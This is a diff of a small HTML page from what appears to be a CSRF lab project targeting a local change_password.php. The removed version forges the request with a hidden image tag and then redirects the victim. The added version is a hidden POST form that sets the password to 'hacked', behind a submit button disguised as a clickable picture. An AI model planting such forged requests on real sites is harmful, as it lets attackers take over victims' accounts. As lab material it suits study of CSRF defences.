@@ -1,18 +1,16 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Attack CSRF - Change Password</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Attack</title>
 </head>
 <body>
-  <h1>Attack - Change Password</h1>
-
-  <img src="http://localhost/CSRF_Project/change_password.php?password=NewPasswordAttacker?cpassword=NewPasswordAttacker" alt="Attack CSRF" style="display:none">
-
-  <script>
-    // Redireccionar a la víctima después de realizar la solicitud invisible
-    setTimeout(function() {
-      window.location.href = "home.php";
-    }, 2000);
-  </script>
+  <form action="http://localhost/ProyectoCSRF/change_password.php" method="post">
+    
+    <input type="hidden" name="password" value="hacked" require><br><br>
+    <input type="hidden" name="cpassword" value="hacked" require><br><br>
+    <input type="submit" value="" name="submit" style="padding: 60px 90px; background-image: url('hook.jpg')"><br><br>
+  </form>
 </body>
 </html>
